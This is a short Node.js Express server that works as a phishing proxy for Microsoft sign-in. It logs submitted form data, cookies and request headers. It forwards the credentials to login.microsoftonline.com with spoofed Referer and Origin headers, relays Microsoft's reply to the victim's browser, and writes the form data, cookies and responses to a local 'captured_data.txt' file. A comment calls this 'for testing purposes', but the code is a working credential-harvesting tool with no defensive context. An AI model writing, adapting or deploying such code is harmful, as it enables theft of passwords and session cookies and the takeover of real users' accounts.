const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const axios = require("axios");
const fs = require("fs");

const app = express();

// Middleware for parsing form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve the login page
app.post("/", (req, res) => {
  res.redirect("https://login.microsoftonline.com/common/login");
  console.log("cookies:", req.headers.cookie);
  console.log("req.header: ", req.headers);
});

// Handle form submission
app.post("/login", async (req, res) => {
  console.log("Incoming form data:", req.body);

  try {
    // Forward the form data to Microsoft
    const microsoftResponse = await axios.post(
      "https://login.microsoftonline.com/common/login",
      req.body,
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Cookie: req.headers.cookie || "",
          "User-Agent": req.headers["user-agent"],
          Referer: "https://login.microsoftonline.com",
          Origin: "https://login.microsoftonline.com",
        },
      }
    );

    console.log("Microsoft Response:", microsoftResponse.data);

    // Save captured data locally (for testing purposes)
    const logData = `Form Data: ${JSON.stringify(req.body)}\nCookies: ${
      req.headers.cookie
    }\nResponse: ${JSON.stringify(microsoftResponse.data)}\n\n`;
    fs.appendFileSync("captured_data.txt", logData);

    // Send Microsoft’s response back to the browser
    res.send(microsoftResponse.data);
  } catch (err) {
    console.error("Error:", err.response?.data || err.message);
    res
      .status(err.response?.status || 500)
      .send(err.response?.data || "Error forwarding request");
  }
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
